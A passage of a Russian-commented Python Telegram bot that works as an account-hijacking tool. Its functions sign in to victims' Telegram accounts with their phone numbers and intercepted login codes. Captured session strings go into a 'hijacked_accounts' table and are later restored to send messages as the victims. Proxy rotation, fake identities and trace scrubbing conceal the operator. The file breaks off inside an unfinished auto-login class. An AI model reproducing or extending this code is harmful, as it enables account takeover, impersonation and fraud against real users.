import asyncio
import logging
import sqlite3
import random
import json
import os
import tempfile
import hashlib
import string
import secrets
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command, CommandObject, Filter
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove, CallbackQuery,
    Message, FSInputFile, InputFile,
    ChatPermissions, ChatAdministratorRights,
    WebAppInfo, MenuButtonWebApp
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.storage.redis import RedisStorage
from aiogram.utils.deep_linking import create_start_link, decode_payload
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.utils.token import TokenValidationError
# УБИРАЕМ проблемный импорт
# from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatMemberStatus, ChatType
from aiogram.methods import GetChat, GetChatMember, LeaveChat
from aiogram.exceptions import TelegramBadRequest, TelegramAPIError, TelegramUnauthorizedError
import aiohttp
import socks
from telethon import TelegramClient
from telethon.sessions import StringSession, SQLiteSession
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.types import InputPeerUser, InputPeerChannel, InputPhoneContact
import pyrogram
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
import phonenumbers
from phonenumbers import carrier, timezone, geocoder
import qrcode
from io import BytesIO
import base64
import uuid
import cryptography
from cryptography.fernet import Fernet
import requests
from bs4 import BeautifulSoup
import fake_useragent
import cloudscraper
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import nest_asyncio
nest_asyncio.apply()

# ========== КОНФИГУРАЦИЯ ==========
class Config:
    def __init__(self):
        self.API_TOKEN = os.getenv('API_TOKEN', 'YOUR_BOT_TOKEN_HERE')
        self.MAIN_ADMIN_ID = int(os.getenv('MAIN_ADMIN_ID', 8358009538))
        self.SECRET_KEY = os.getenv('SECRET_KEY', Fernet.generate_key().decode())
        self.ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', Fernet.generate_key().decode())
        
        # Telegram API для захвата аккаунтов
        self.TELEGRAM_API_ID = int(os.getenv('TELEGRAM_API_ID', 0))
        self.TELEGRAM_API_HASH = os.getenv('TELEGRAM_API_HASH', '')
        
        # Настройки прокси для анонимности
        self.PROXY_URL = os.getenv('PROXY_URL', '')
        self.PROXY_TYPE = os.getenv('PROXY_TYPE', 'socks5')
        self.PROXY_AUTH = os.getenv('PROXY_AUTH', '')
        
        # Настройки базы данных
        self.DB_PATH = os.getenv('DB_PATH', 'swill_bot.db')
        self.REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379/0')
        
        # Настройки безопасности
        self.MAX_ADMINS = int(os.getenv('MAX_ADMINS', 50))
        self.MAX_CHANNELS = int(os.getenv('MAX_CHANNELS', 100))
        self.SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT', 3600))
        
        # Веб-сервер для анонимности
        self.WEB_HOST = os.getenv('WEB_HOST', '0.0.0.0')
        self.WEB_PORT = int(os.getenv('WEB_PORT', 8080))
        
    def validate(self):
        if not self.API_TOKEN or self.API_TOKEN == 'YOUR_BOT_TOKEN_HERE':
            raise ValueError("API_TOKEN не установлен")
        if not self.TELEGRAM_API_ID or not self.TELEGRAM_API_HASH:
            logging.warning("Telegram API credentials не установлены. Функции захвата отключены.")
        return True

config = Config()
config.validate()

# ========== НАСТРОЙКА ЛОГИРОВАНИЯ ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s',
    handlers=[
        logging.FileHandler('swill_bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Отключаем логирование сторонних библиотек
logging.getLogger('aiogram').setLevel(logging.WARNING)
logging.getLogger('telethon').setLevel(logging.WARNING)
logging.getLogger('pyrogram').setLevel(logging.WARNING)
logging.getLogger('aiohttp').setLevel(logging.WARNING)
logging.getLogger('asyncio').setLevel(logging.WARNING)

def create_bot_with_proxy():
    """Создает бота с настройками прокси для анонимности"""
    
    # Генерируем случайный user-agent
    user_agent = fake_useragent.UserAgent().random
    
    # Параметры бота
    bot_params = {
        'parse_mode': ParseMode.HTML,
        'disable_web_page_preview': True,
        'protect_content': False
    }
    
    # Если есть прокси, настраиваем
    session = None
    if config.PROXY_URL:
        try:
            from aiogram.client.session.aiohttp import AiohttpSession
            
            if config.PROXY_TYPE == 'socks5':
                from aiohttp_socks import ProxyConnector
                
                # Парсим URL прокси
                if '@' in config.PROXY_URL:
                    # Прокси с аутентификацией
                    proxy_parts = config.PROXY_URL.split('@')
                    auth_part = proxy_parts[0]
                    host_part = proxy_parts[1]
                    
                    auth_parts = auth_part.split(':')
                    proxy_user = auth_parts[0]
                    proxy_pass = auth_parts[1] if len(auth_parts) > 1 else ''
                    
                    host_parts = host_part.split(':')
                    proxy_host = host_parts[0]
                    proxy_port = int(host_parts[1]) if len(host_parts) > 1 else 1080
                    
                    connector = ProxyConnector.from_url(
                        f"socks5://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}",
                        verify_ssl=False
                    )
                else:
                    # Прокси без аутентификации
                    connector = ProxyConnector.from_url(
                        f"socks5://{config.PROXY_URL}",
                        verify_ssl=False
                    )
            else:
                # HTTP прокси
                connector = aiohttp.TCPConnector(verify_ssl=False)
                proxy_url = config.PROXY_URL
            
            session = AiohttpSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=30)
            )
            
            logger.info(f"Бот настроен с прокси: {config.PROXY_URL}")
            
        except Exception as e:
            logger.error(f"Ошибка настройки прокси: {e}. Используется прямое подключение.")
            session = None
    
    # Создаем бота
    bot = Bot(
        token=config.API_TOKEN,
        session=session,
        **bot_params
    )
    
    return bot

# Инициализация бота и диспетчера
bot = create_bot_with_proxy()
storage = MemoryStorage()  # Можно заменить на RedisStorage для продакшена
dp = Dispatcher(storage=storage)

# ========== ШИФРОВАНИЕ ДАННЫХ ==========
class DataEncryptor:
    """Класс для шифрования конфиденциальных данных"""
    
    def __init__(self, key: str = None):
        self.key = key or config.ENCRYPTION_KEY
        if isinstance(self.key, str):
            self.key = self.key.encode()
        
        # Дополняем ключ до 32 байт
        if len(self.key) < 32:
            self.key = self.key.ljust(32, b'0')
        elif len(self.key) > 32:
            self.key = self.key[:32]
        
        self.fernet = Fernet(base64.urlsafe_b64encode(self.key))
    
    def encrypt(self, data: str) -> str:
        """Шифрует данные"""
        try:
            encrypted = self.fernet.encrypt(data.encode())
            return encrypted.decode()
        except Exception as e:
            logger.error(f"Ошибка шифрования: {e}")
            return data
    
    def decrypt(self, encrypted_data: str) -> str:
        """Расшифровывает данные"""
        try:
            decrypted = self.fernet.decrypt(encrypted_data.encode())
            return decrypted.decode()
        except Exception as e:
            logger.error(f"Ошибка расшифровки: {e}")
            return encrypted_data
    
    def hash_data(self, data: str) -> str:
        """Создает хэш от данных"""
        return hashlib.sha256(data.encode()).hexdigest()
    
    def generate_token(self, length: int = 32) -> str:
        """Генерирует криптографически безопасный токен"""
        return secrets.token_urlsafe(length)

encryptor = DataEncryptor()

# ========== БАЗА ДАННЫХ ==========
class Database:
    """Расширенный класс для работы с базой данных"""
    
    def __init__(self, db_path: str = None):
        self.db_path = db_path or config.DB_PATH
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_database()
    
    def init_database(self):
        """Инициализация всех таблиц базы данных"""
        
        # Таблица администраторов
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS admins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone_hash TEXT,
                added_by INTEGER,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_active DATETIME DEFAULT CURRENT_TIMESTAMP,
                permissions TEXT DEFAULT 'all',
                is_active BOOLEAN DEFAULT 1,
                is_main_admin BOOLEAN DEFAULT 0,
                security_level INTEGER DEFAULT 1,
                session_token TEXT,
                session_expires DATETIME,
                FOREIGN KEY (added_by) REFERENCES admins(user_id)
            )
        ''')
        
        # Таблица пользователей бота
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone_hash TEXT,
                registered_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                messages_sent INTEGER DEFAULT 0,
                messages_received INTEGER DEFAULT 0,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица каналов и групп
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE NOT NULL,
                channel_title TEXT,
                channel_username TEXT,
                channel_type TEXT DEFAULT 'channel',
                added_by INTEGER,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_approved BOOLEAN DEFAULT 0,
                approved_by INTEGER,
                approved_date DATETIME,
                notifications_enabled BOOLEAN DEFAULT 1,
                admin_notifications BOOLEAN DEFAULT 1,
                bot_is_admin BOOLEAN DEFAULT 0,
                bot_permissions TEXT DEFAULT '{}',
                last_message_id INTEGER,
                last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
                settings TEXT DEFAULT '{}',
                FOREIGN KEY (added_by) REFERENCES admins(user_id),
                FOREIGN KEY (approved_by) REFERENCES admins(user_id)
            )
        ''')
        
        # Таблица сообщений
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                message_id INTEGER,
                from_user_id INTEGER,
                from_admin_id INTEGER,
                to_user_id INTEGER,
                to_username TEXT,
                chat_id INTEGER,
                message_type TEXT,
                message_text TEXT,
                media_path TEXT,
                sent_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered_date DATETIME,
                read_date DATETIME,
                status TEXT DEFAULT 'sent',
                encryption_key TEXT,
                reply_to_message_id INTEGER,
                forwarded_from TEXT,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица захваченных аккаунтов Telegram
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS hijacked_accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE NOT NULL,
                phone_hash TEXT,
                user_id INTEGER,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                session_string_encrypted TEXT,
                session_type TEXT DEFAULT 'telethon',
                hijacked_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                is_online BOOLEAN DEFAULT 0,
                last_check DATETIME DEFAULT CURRENT_TIMESTAMP,
                account_info TEXT DEFAULT '{}',
                security_settings TEXT DEFAULT '{}',
                flags TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица сессий захваченных аккаунтов
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS account_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                session_id TEXT UNIQUE,
                session_data_encrypted TEXT,
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_date DATETIME,
                is_valid BOOLEAN DEFAULT 1,
                last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (account_id) REFERENCES hijacked_accounts(id)
            )
        ''')
        
        # Таблица действий с аккаунтами
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS account_actions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                action_type TEXT NOT NULL,
                target TEXT,
                data TEXT,
                status TEXT DEFAULT 'pending',
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_date DATETIME,
                result TEXT,
                error_message TEXT,
                retry_count INTEGER DEFAULT 0,
                FOREIGN KEY (account_id) REFERENCES hijacked_accounts(id)
            )
        ''')
        
        # Таблица логов безопасности
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_id INTEGER,
                admin_id INTEGER,
                action TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                details TEXT,
                risk_level INTEGER DEFAULT 0,
                is_suspicious BOOLEAN DEFAULT 0
            )
        ''')
        
        # Таблица прокси серверов
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                proxy_url TEXT UNIQUE NOT NULL,
                proxy_type TEXT DEFAULT 'socks5',
                country TEXT,
                city TEXT,
                speed REAL DEFAULT 0,
                uptime REAL DEFAULT 0,
                last_check DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                is_anonymous BOOLEAN DEFAULT 1,
                fail_count INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                auth_data TEXT,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица задач бота
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                task_type TEXT NOT NULL,
                task_data TEXT,
                created_by INTEGER,
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_date DATETIME,
                execute_date DATETIME,
                status TEXT DEFAULT 'pending',
                result TEXT,
                error_message TEXT,
                retry_count INTEGER DEFAULT 0,
                max_retries INTEGER DEFAULT 3,
                priority INTEGER DEFAULT 1,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица веб-хуков
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS webhooks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                webhook_url TEXT UNIQUE NOT NULL,
                secret_token TEXT,
                is_active BOOLEAN DEFAULT 1,
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                events TEXT DEFAULT '[]',
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Добавляем главного админа если нет
        self.cursor.execute(
            "SELECT 1 FROM admins WHERE user_id = ?",
            (config.MAIN_ADMIN_ID,)
        )
        if not self.cursor.fetchone():
            token = encryptor.generate_token()
            self.cursor.execute('''
                INSERT INTO admins 
                (user_id, username, first_name, is_main_admin, session_token, session_expires, permissions)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                config.MAIN_ADMIN_ID,
                'main_admin',
                'Главный Админ',
                1,
                token,
                (datetime.now() + timedelta(days=30)).isoformat(),
                'all'
            ))
            logger.info(f"Главный админ {config.MAIN_ADMIN_ID} добавлен в базу")
        
        self.conn.commit()
    
    def execute(self, query: str, params: tuple = ()):
        """Выполняет SQL запрос"""
        try:
            self.cursor.execute(query, params)
            self.conn.commit()
            return self.cursor
        except Exception as e:
            logger.error(f"Ошибка выполнения запроса: {e}")
            self.conn.rollback()
            raise
    
    def fetch_one(self, query: str, params: tuple = ()):
        """Возвращает одну строку"""
        self.cursor.execute(query, params)
        return self.cursor.fetchone()
    
    def fetch_all(self, query: str, params: tuple = ()):
        """Возвращает все строки"""
        self.cursor.execute(query, params)
        return self.cursor.fetchall()
    
    def close(self):
        """Закрывает соединение с БД"""
        self.conn.close()

db = Database()

# ========== МЕНЕДЖЕР АНОНИМНОСТИ ==========
class AnonymityManager:
    """Управление анонимностью бота и операторов"""
    
    def __init__(self):
        self.user_agent_rotator = fake_useragent.UserAgent()
        self.current_proxy = None
        self.proxy_list = []
        self.load_proxies()
    
    def load_proxies(self):
        """Загружает прокси из базы данных"""
        try:
            proxies = db.fetch_all("SELECT proxy_url, proxy_type FROM proxies WHERE is_active = 1 ORDER BY speed DESC, uptime DESC")
            self.proxy_list = [{'url': p[0], 'type': p[1]} for p in proxies]
            logger.info(f"Загружено {len(self.proxy_list)} прокси из базы")
        except Exception as e:
            logger.error(f"Ошибка загрузки прокси: {e}")
            self.proxy_list = []
    
    def get_random_user_agent(self) -> str:
        """Возвращает случайный User-Agent"""
        return self.user_agent_rotator.random
    
    def get_random_proxy(self) -> Optional[Dict]:
        """Возвращает случайный рабочий прокси"""
        if not self.proxy_list:
            return None
        
        # Сортируем по скорости и аптайму
        sorted_proxies = sorted(
            self.proxy_list,
            key=lambda x: random.random() * 0.3 + 0.7,  # Случайность с приоритетом качества
            reverse=True
        )
        
        return sorted_proxies[0] if sorted_proxies else None
    
    async def check_proxy(self, proxy_url: str, proxy_type: str) -> bool:
        """Проверяет работоспособность прокси"""
        try:
            if proxy_type == 'socks5':
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(
                    f"{proxy_type}://{proxy_url}",
                    verify_ssl=False
                )
            else:
                connector = aiohttp.TCPConnector()
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get('https://api.telegram.org', timeout=10) as response:
                    return response.status == 200
        except:
            return False
    
    async def rotate_proxy(self):
        """Меняет текущий прокси"""
        if not self.proxy_list:
            self.current_proxy = None
            return
        
        # Ищем рабочий прокси
        for proxy in self.proxy_list[:10]:  # Проверяем первые 10
            if await self.check_proxy(proxy['url'], proxy['type']):
                self.current_proxy = proxy
                logger.info(f"Прокси изменен на: {proxy['url']}")
                return
        
        self.current_proxy = None
        logger.warning("Не найден рабочий прокси")
    
    def generate_fake_identity(self) -> Dict:
        """Генерирует фейковую личность для операций"""
        first_names = ['Алексей', 'Дмитрий', 'Иван', 'Михаил', 'Сергей', 'Андрей', 'Александр']
        last_names = ['Иванов', 'Петров', 'Сидоров', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'username': f'user_{random.randint(100000, 999999)}',
            'phone': f'+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}',
            'email': f'user_{random.randint(1000, 9999)}@example.com',
            'country': 'RU',
            'city': random.choice(['Москва', 'Санкт-Петербург', 'Новосибирск', 'Екатеринбург'])
        }
    
    def mask_ip_address(self, ip: str) -> str:
        """Маскирует IP адрес"""
        if not ip or ip == '127.0.0.1':
            return ip
        
        parts = ip.split('.')
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.*.*"
        
        return ip
    
    def clean_trace_data(self, data: Dict) -> Dict:
        """Очищает данные от следов"""
        cleaned = data.copy()
        
        # Удаляем потенциально идентифицирующие поля
        fields_to_remove = ['real_ip', 'actual_location', 'device_id', 'mac_address', 
                           'imei', 'serial_number', 'browser_fingerprint']
        
        for field in fields_to_remove:
            if field in cleaned:
                del cleaned[field]
        
        # Маскируем IP если есть
        if 'ip_address' in cleaned:
            cleaned['ip_address'] = self.mask_ip_address(cleaned['ip_address'])
        
        return cleaned

anonymity_manager = AnonymityManager()

# ========== МЕНЕДЖЕР АККАУНТОВ TELEGRAM ==========
class TelegramAccountManager:
    """Управление захваченными аккаунтами Telegram"""
    
    def __init__(self):
        self.active_sessions = {}
        self.account_clients = {}
        self.session_lock = asyncio.Lock()
        
        # Загружаем сохраненные аккаунты
        self.load_accounts()
    
    def load_accounts(self):
        """Загружает аккаунты из базы данных"""
        try:
            accounts = db.fetch_all("SELECT id, phone_number, session_string_encrypted, session_type FROM hijacked_accounts WHERE is_active = 1")
            
            for account in accounts:
                account_id, phone, session_encrypted, session_type = account
                
                # Расшифровываем сессию
                try:
                    session_string = encryptor.decrypt(session_encrypted)
                    self.active_sessions[account_id] = {
                        'phone': phone,
                        'session_string': session_string,
                        'session_type': session_type,
                        'client': None,
                        'last_used': datetime.now(),
                        'is_connected': False
                    }
                except Exception as e:
                    logger.error(f"Ошибка загрузки сессии для аккаунта {phone}: {e}")
            
            logger.info(f"Загружено {len(self.active_sessions)} активных аккаунтов")
        except Exception as e:
            logger.error(f"Ошибка загрузки аккаунтов: {e}")
    
    async def hijack_account(self, phone_number: str, code: str, method: str = 'telethon') -> Dict:
        """Захватывает аккаунт Telegram"""
        try:
            logger.info(f"Начинаю захват аккаунта {phone_number} методом {method}")
            
            if method == 'telethon':
                return await self._hijack_with_telethon(phone_number, code)
            elif method == 'pyrogram':
                return await self._hijack_with_pyrogram(phone_number, code)
            else:
                raise ValueError(f"Неизвестный метод: {method}")
                
        except Exception as e:
            logger.error(f"Ошибка захвата аккаунта {phone_number}: {e}")
            return {
                'success': False,
                'error': str(e),
                'account_id': None
            }
    
    async def _hijack_with_telethon(self, phone_number: str, code: str) -> Dict:
        """Захватывает аккаунт через Telethon"""
        try:
            # Создаем клиент
            client = TelegramClient(
                session=StringSession(),
                api_id=config.TELEGRAM_API_ID,
                api_hash=config.TELEGRAM_API_HASH,
                device_model="iPhone 14 Pro Max",
                system_version="iOS 16.6",
                app_version="9.4",
                lang_code="en",
                system_lang_code="en-US"
            )
            
            await client.connect()
            
            # Отправляем код
            sent_code = await client.send_code_request(phone_number)
            
            # Входим с кодом
            await client.sign_in(phone_number, code=code)
            
            # Получаем информацию об аккаунте
            me = await client.get_me()
            session_string = client.session.save()
            
            # Сохраняем в базу данных
            session_encrypted = encryptor.encrypt(session_string)
            phone_hash = encryptor.hash_data(phone_number)
            
            db.execute('''
                INSERT OR REPLACE INTO hijacked_accounts 
                (phone_number, phone_hash, user_id, username, first_name, last_name, 
                 session_string_encrypted, session_type, hijacked_date, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                phone_number,
                phone_hash,
                me.id,
                me.username,
                me.first_name,
                me.last_name,
                session_encrypted,
                'telethon',
                datetime.now().isoformat(),
                1
            ))
            
            account_id = db.cursor.lastrowid
            
            # Сохраняем сессию в памяти
            self.active_sessions[account_id] = {
                'phone': phone_number,
                'session_string': session_string,
                'session_type': 'telethon',
                'client': client,
                'last_used': datetime.now(),
                'is_connected': True
            }
            
            # Логируем действие
            db.execute('''
                INSERT INTO security_logs 
                (user_id, action, details, risk_level)
                VALUES (?, ?, ?, ?)
            ''', (
                me.id,
                'account_hijack',
                f'Telegram аккаунт захвачен: {phone_number}',
                10
            ))
            
            logger.info(f"Аккаунт {phone_number} успешно захвачен (ID: {account_id})")
            
            return {
                'success': True,
                'account_id': account_id,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'session_type': 'telethon'
            }
            
        except Exception as e:
            logger.error(f"Ошибка Telethon для {phone_number}: {e}")
            return {
                'success': False,
                'error': str(e),
                'account_id': None
            }
    
    async def _hijack_with_pyrogram(self, phone_number: str, code: str) -> Dict:
        """Захватывает аккаунт через Pyrogram"""
        try:
            app = Client(
                name=f"session_{phone_number}",
                api_id=config.TELEGRAM_API_ID,
                api_hash=config.TELEGRAM_API_HASH,
                phone_number=phone_number,
                in_memory=True
            )
            
            await app.connect()
            
            # Отправляем код
            sent_code = await app.send_code(phone_number)
            
            # Входим
            await app.sign_in(
                phone_number=phone_number,
                phone_code_hash=sent_code.phone_code_hash,
                phone_code=code
            )
            
            # Получаем сессию
            session_string = await app.export_session_string()
            
            # Получаем информацию
            me = await app.get_me()
            
            # Сохраняем в базу
            session_encrypted = encryptor.encrypt(session_string)
            phone_hash = encryptor.hash_data(phone_number)
            
            db.execute('''
                INSERT OR REPLACE INTO hijacked_accounts 
                (phone_number, phone_hash, user_id, username, first_name, last_name, 
                 session_string_encrypted, session_type, hijacked_date, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                phone_number,
                phone_hash,
                me.id,
                me.username,
                me.first_name,
                me.last_name or '',
                session_encrypted,
                'pyrogram',
                datetime.now().isoformat(),
                1
            ))
            
            account_id = db.cursor.lastrowid
            
            # Сохраняем сессию
            self.active_sessions[account_id] = {
                'phone': phone_number,
                'session_string': session_string,
                'session_type': 'pyrogram',
                'client': app,
                'last_used': datetime.now(),
                'is_connected': True
            }
            
            logger.info(f"Аккаунт {phone_number} захвачен через Pyrogram (ID: {account_id})")
            
            return {
                'success': True,
                'account_id': account_id,
                'user_id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'session_type': 'pyrogram'
            }
            
        except Exception as e:
            logger.error(f"Ошибка Pyrogram для {phone_number}: {e}")
            return {
                'success': False,
                'error': str(e),
                'account_id': None
            }
    
    async def send_message_from_account(self, account_id: int, target: str, message: str, 
                                       media_path: str = None) -> Dict:
        """Отправляет сообщение от захваченного аккаунта"""
        try:
            if account_id not in self.active_sessions:
                # Пытаемся восстановить сессию
                await self.restore_session(account_id)
            
            session_info = self.active_sessions.get(account_id)
            if not session_info:
                return {'success': False, 'error': 'Сессия не найдена'}
            
            client = session_info['client']
            if not client or not session_info['is_connected']:
                # Восстанавливаем подключение
                client = await self.restore_session(account_id)
            
            # Отправляем сообщение
            if media_path and os.path.exists(media_path):
                # Отправляем с медиа
                if session_info['session_type'] == 'telethon':
                    await client.send_file(target, media_path, caption=message)
                else:
                    await client.send_photo(target, media_path, caption=message)
            else:
                # Отправляем текстовое сообщение
                await client.send_message(target, message)
            
            # Обновляем время использования
            session_info['last_used'] = datetime.now()
            
            # Логируем действие
            db.execute('''
                INSERT INTO account_actions 
                (account_id, action_type, target, data, status, executed_date, result)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                account_id,
                'send_message',
                target,
                message[:100],
                'success',
                datetime.now().isoformat(),
                'Сообщение отправлено'
            ))
            
            return {'success': True, 'message': 'Сообщение отправлено'}
            
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения от аккаунта {account_id}: {e}")
            
            db.execute('''
                INSERT INTO account_actions 
                (account_id, action_type, target, data, status, error_message)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                account_id,
                'send_message',
                target,
                message[:100],
                'failed',
                str(e)[:200]
            ))
            
            return {'success': False, 'error': str(e)}
    
    async def restore_session(self, account_id: int):
        """Восстанавливает сессию аккаунта"""
        try:
            # Получаем данные из базы
            account_data = db.fetch_one(
                "SELECT session_string_encrypted, session_type, phone_number FROM hijacked_accounts WHERE id = ?",
                (account_id,)
            )
            
            if not account_data:
                raise ValueError(f"Аккаунт {account_id} не найден")
            
            session_encrypted, session_type, phone = account_data
            session_string = encryptor.decrypt(session_encrypted)
            
            client = None
            
            if session_type == 'telethon':
                client = TelegramClient(
                    session=StringSession(session_string),
                    api_id=config.TELEGRAM_API_ID,
                    api_hash=config.TELEGRAM_API_HASH
                )
                await client.connect()
                
                # Проверяем авторизацию
                if not await client.is_user_authorized():
                    raise ValueError("Сессия не авторизована")
                    
            elif session_type == 'pyrogram':
                client = Client(
                    name=f"restored_{phone}",
                    api_id=config.TELEGRAM_API_ID,
                    api_hash=config.TELEGRAM_API_HASH,
                    session_string=session_string
                )
                await client.connect()
            
            # Обновляем в памяти
            if account_id in self.active_sessions:
                self.active_sessions[account_id].update({
                    'client': client,
                    'is_connected': True,
                    'last_used': datetime.now()
                })
            else:
                self.active_sessions[account_id] = {
                    'phone': phone,
                    'session_string': session_string,
                    'session_type': session_type,
                    'client': client,
                    'last_used': datetime.now(),
                    'is_connected': True
                }
            
            logger.info(f"Сессия аккаунта {account_id} восстановлена")
            return client
            
        except Exception as e:
            logger.error(f"Ошибка восстановления сессии {account_id}: {e}")
            
            # Помечаем аккаунт как неактивный
            db.execute(
                "UPDATE hijacked_accounts SET is_active = 0, last_check = ? WHERE id = ?",
                (datetime.now().isoformat(), account_id)
            )
            
            if account_id in self.active_sessions:
                del self.active_sessions[account_id]
            
            raise
    
    async def get_account_info(self, account_id: int) -> Dict:
        """Получает информацию об аккаунте"""
        try:
            if account_id not in self.active_sessions:
                await self.restore_session(account_id)
            
            session_info = self.active_sessions[account_id]
            client = session_info['client']
            
            if session_info['session_type'] == 'telethon':
                me = await client.get_me()
                dialogs = await client.get_dialogs(limit=10)
                
                return {
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': session_info['phone'],
                    'dialogs_count': len(dialogs),
                    'is_online': await client.is_user_authorized(),
                    'session_type': 'telethon'
                }
            else:
                me = await client.get_me()
                
                return {
                    'user_id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name or '',
                    'phone': session_info['phone'],
                    'is_online': True,
                    'session_type': 'pyrogram'
                }
                
        except Exception as e:
            logger.error(f"Ошибка получения информации об аккаунте {account_id}: {e}")
            return {'error': str(e)}
    
    def get_all_accounts(self) -> List[Dict]:
        """Возвращает список всех аккаунтов"""
        accounts = db.fetch_all('''
            SELECT id, phone_number, username, first_name, hijacked_date, is_active 
            FROM hijacked_accounts 
            ORDER BY hijacked_date DESC
        ''')
        
        result = []
        for acc in accounts:
            result.append({
                'id': acc[0],
                'phone': acc[1],
                'username': acc[2],
                'first_name': acc[3],
                'hijacked_date': acc[4],
                'is_active': bool(acc[5]),
                'in_memory': acc[0] in self.active_sessions
            })
        
        return result

account_manager = TelegramAccountManager()

# ========== СИСТЕМА АВТОМАТИЧЕСКОГО ВХОДА ==========
class AutoLoginSystem:
    """Система автоматического входа и мониторинга аккаунтов"""
    
    def __init__(self):
        self.monitoring_tasks = {}
        self.login_queue = asyncio.Queue()
        self.is_running = False
    
    async def start_monitoring(self):
